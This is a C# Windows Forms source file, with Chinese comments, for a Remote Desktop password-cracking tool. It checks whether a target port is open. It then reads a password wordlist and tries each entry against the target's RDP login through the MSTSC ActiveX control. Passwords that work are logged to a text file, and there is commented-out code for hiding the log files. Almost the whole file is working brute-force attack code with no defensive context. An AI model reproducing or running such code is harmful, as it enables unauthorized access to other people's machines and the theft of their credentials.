using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MSTSCLib;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;

namespace WindowsFormsApp4
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public string _ip = string.Empty;
        public int _port = 0;
        public Socket _socket = null;
        public byte[] buffer = new byte[1024 * 1024 * 2];
        static int StartHeck_flag = 0;
        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="ip">连接服务器的IP</param>
        /// <param name="port">连接服务器的端口</param>
/*      public void SocketClient(string ip, int port)
         {
            this._ip = ip;
            this._port = port;
         }
*/
        public void SocketClient(string socket_ip, int socket_port)
        {
            this._ip = socket_ip;
            this._port = socket_port;
        }

        /// <summary>
        /// 开启服务,连接服务端
        /// </summary>
        static String FtpReturn_Str = null;
        static int Time_Out = 0;
        public void StartClient()
        {
            try
            {
                //1.0 实例化套接字(IP4寻址地址,流式传输,TCP协议)
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //2.0 创建IP对象
                IPAddress address = IPAddress.Parse(_ip);
                //3.0 创建网络端口包括ip和端口
                IPEndPoint endPoint = new IPEndPoint(address, _port);
                //4.0 建立连接
                _socket.BeginConnect(endPoint, CallBackMethod, _socket);
                //阻塞当前线程           
                /*if (TimeoutObject.WaitOne(1000, false))//1s超时
                {
                    MessageBox.Show("网络正常");
                }
                else
                {
                    MessageBox.Show("连接超时");
                }
                //接收返回值
                byte[] buffer = new byte[1024 * 1024 * 3];
                //实际接收到的有效字节数
                int FtpReturn_len = _socket.Receive(buffer);//获取buffer（int）
                FtpReturn_Str = Encoding.UTF8.GetString(buffer, 0, FtpReturn_len);//FTPsocket返回值,UTF8编码buffer转为string格式
          */
                if (TimeoutObject.WaitOne(1000, false))//1s超时//StartHeck_flag为0时，破解按钮没被开启，能弹窗“网络正常”
                {
                    if (StartHeck_flag == 0)
                    {
                        MessageBox.Show("网络正常，端口开放！");
                        WriteSeachInfo(textBox1.Text);
                        WriteSeachInfo(textBox4.Text);
                    }
                    Time_Out = 0;
                }
                else
                {
                    if (StartHeck_flag == 0)
                    {
                        MessageBox.Show("连接超时");
                    }
                    Time_Out = 1;//超时标志
                }
            }
            catch (Exception ex)
            {
                // _socket.Shutdown(SocketShutdown.Both);
                _socket.Close();
                MessageBox.Show(ex.Message);//远程主机强迫关闭了一个连接/无法连接/连接失败/通讯失败
            }
            //            Thread.Sleep(2000);
            //            MessageBox.Show("发送消息结束");
        }

        public readonly ManualResetEvent TimeoutObject = new ManualResetEvent(false);
        /// <summary> 
        /// Socket连接请求       
        /// </summary>     
        ///<param name="remoteEndPoint">网络端点</param>      
        ///<param name="timeoutMSec">超时时间</param> 

        //--异步回调方法       
        public void CallBackMethod(IAsyncResult asyncresult)
        {
            //使阻塞的线程继续        
            TimeoutObject.Set();
        }



        public void ms2_Load(object sender, EventArgs e)
        {

        }

        public void rdp_OnConnecting(object sender, EventArgs e)
        {

        }
        //rdp自动登陆delay函数
        [DllImport("kernel32.dll")]
        static extern uint GetTickCount();
        static void Delay(int ms)
        {
            int start = Environment.TickCount;
            while (Math.Abs(Environment.TickCount - start) < ms)
            {
                System.Windows.Forms.Application.DoEvents();
            }
        }

        //rdp建立连接用通用函数
        public void StartConnection(string IpName, String UserName, String PassWord)
        {

            rdp.Server = IpName;  //rdp为窗体名字,rdp.Server设置IP
            rdp.UserName = UserName; //用户名
            IMsTscNonScriptable secured = (IMsTscNonScriptable)rdp.GetOcx();
            secured.ClearTextPassword = PassWord;//密码
            rdp.Connect();

        }




        //远程连接按钮（需要手动输入IP、用户名、密码，没有Disconnect只能尝试一次）
        public void rdp_button_Click(object sender, EventArgs e)
        {
            StartConnection(textBox1.Text, textBox2.Text, textBox3.Text);
        }

        //左部刷新按钮（断开账户连接，显示屏还在）
        public void RdpReflsh_button_Click(object sender, EventArgs e)
        {
            rdp.Disconnect();//disconect太快了【问题解决】
            Delay(20000);
            rdp_button_Click(null, null);
        }

        //破解停止按钮
        static int stopheck_flag = 0;//停止破解标志，1即是停止

        //破解写入txt函数（非覆盖式写入）
        public void WriteHeck(string txt)
        {
            if (!System.IO.File.Exists(@"C:\FTP\WriteHeck.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\WriteHeck.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                //System.IO.File.SetAttributes(@"c:\FTP\WriteHeck.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sw.WriteLine("[" + txt + "]" + flag_time);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\WriteHeck.txt", FileMode.Append, FileAccess.Write);
                //System.IO.File.SetAttributes(@"c:\FTP\WriteHeck.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sr.WriteLine("[密码：" + txt + "]" + flag_time);//开始写入值
                sr.Close();
                fs.Close();

            }

        }

        //破解刷新（更新）函数
        public void ReflashHeck()
        {
            Delay(30000);
            rdp.Disconnect();//disconect太快了【问题解决】
            Delay(1000);
        }

        //写入地址段信息
        public void WriteSeachInfo(string txt)
        {

            FileStream fs = new FileStream(@"C:\FTP\MS1.txt", FileMode.Append, FileAccess.Write);
            //System.IO.File.SetAttributes(@"C:\FTP\MS1.txt", FileAttributes.Hidden);
            StreamWriter sr = new StreamWriter(fs);
            sr.WriteLine(txt);//开始写入值
            sr.Close();
            fs.Close();


        }


        //rdp密码登陆检测事件，成功则执行
        int flag = 0;//为1则执行循环

        public void ll(object s, System.EventArgs e)
        {
            flag = 1;
        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            Form1 client = new Form1();
            client.SocketClient(textBox1.Text, int.Parse(textBox4.Text));
            client.StartClient();
            client.Close();
        }

        private void rdp_button_Click_1(object sender, EventArgs e)
        {
            StartConnection(textBox1.Text, textBox2.Text, textBox3.Text);
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            StartHeck_flag = 1;//破解flag置为1，防止跳窗“连接正常”         
            StreamReader sr = new StreamReader(@"C:\FTP\mstsc.txt", Encoding.Default);
            string txt_read = sr.ReadLine();

            while (txt_read != null && stopheck_flag == 0)
            {
                rdp.Server = textBox1.Text;
                rdp.UserName = textBox2.Text;
                IMsTscNonScriptable se = (IMsTscNonScriptable)rdp.GetOcx();
                se.ClearTextPassword = txt_read;
                rdp.OnLoginComplete += ll;
                rdp.Connect();
                //ReflashHeck();//刷新
                Delay(3000);
                if (flag == 1)//破解成功，则写入
                {
                    WriteHeck(txt_read);
                    flag = 0;
                    listBox1.Items.Add("密码：" + txt_read + "，尝试破解成功\r\n");
                    listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
                                                                      // StartConnection(textBox1.Text, textBox2.Text, txt_read);
                    break;
                }
                else
                {
                    listBox1.Items.Add("密码：" + txt_read + "，尝试破解失败\r\n");
                    listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
                    rdp.Disconnect();
                    Delay(1000);
                }

                txt_read = sr.ReadLine();//读入txt密码本的下一行
            }
            MessageBox.Show("破解完毕（破解已停止）");
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            stopheck_flag = 1;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            rdp.Disconnect();//disconect太快了【问题解决】
            Delay(1000);
            rdp_button_Click(null, null);
        }
    }
}
